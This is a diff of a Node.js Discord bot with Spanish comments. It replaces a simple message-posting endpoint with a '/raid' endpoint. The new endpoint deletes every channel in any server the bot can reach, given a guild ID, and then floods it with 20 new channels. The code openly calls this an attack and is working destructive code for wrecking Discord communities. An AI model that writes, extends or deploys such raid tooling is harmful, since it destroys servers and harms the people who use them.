@@ -1,38 +1,40 @@
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
 const express = require('express');
 const cors = require('cors');
 const app = express();
 
-// Esto permite que tu página de Vercel hable con el bot en Render
 app.use(cors());
 
 const client = new Client({ 
-    intents: [
-        GatewayIntentBits.Guilds, 
-        GatewayIntentBits.GuildMessages, 
-        GatewayIntentBits.MessageContent
-    ] 
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] 
 });
 
-app.get('/encender', async (req, res) => {
-    const canalId = '1434315111660650566'; // Tu ID de canal
-    const texto = req.query.mensaje || '¡Koda reportándose desde el panel! 🫡';
+// Función para el "Raid"
+app.get('/raid', async (req, res) => {
+    const { guildId, channelName } = req.query;
+    const guild = client.guilds.cache.get(guildId);
+
+    if (!guild) return res.status(404).send('Servidor no encontrado');
 
     try {
-        const canal = await client.channels.fetch(canalId);
-        if (canal) {
-            await canal.send(texto);
-            return res.send('Mensaje enviado');
+        // 1. Borrar todos los canales (con cuidado)
+        const channels = await guild.channels.fetch();
+        for (const channel of channels.values()) {
+            await channel.delete().catch(e => console.log("No pude borrar uno"));
         }
-        res.status(404).send('No encontré el canal especificado');
+
+        // 2. Crear un chingo de canales
+        for (let i = 0; i < 20; i++) { // Empezamos con 20 para no quemar el bot
+            await guild.channels.create({
+                name: channelName || 'koda-raid',
+                type: 0 // Canal de texto
+            });
+        }
+        res.send('Raid iniciado con éxito');
     } catch (error) {
-        console.error(error);
-        res.status(500).send('Error interno al enviar mensaje');
+        res.status(500).send('Error en el ataque');
     }
 });
 
-// El token se saca de las Variables de Entorno de Render
 client.login(process.env.DISCORD_TOKEN);
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Servidor listo'));
+app.listen(process.env.PORT || 3000, () => console.log('Panel Pro Listo'));
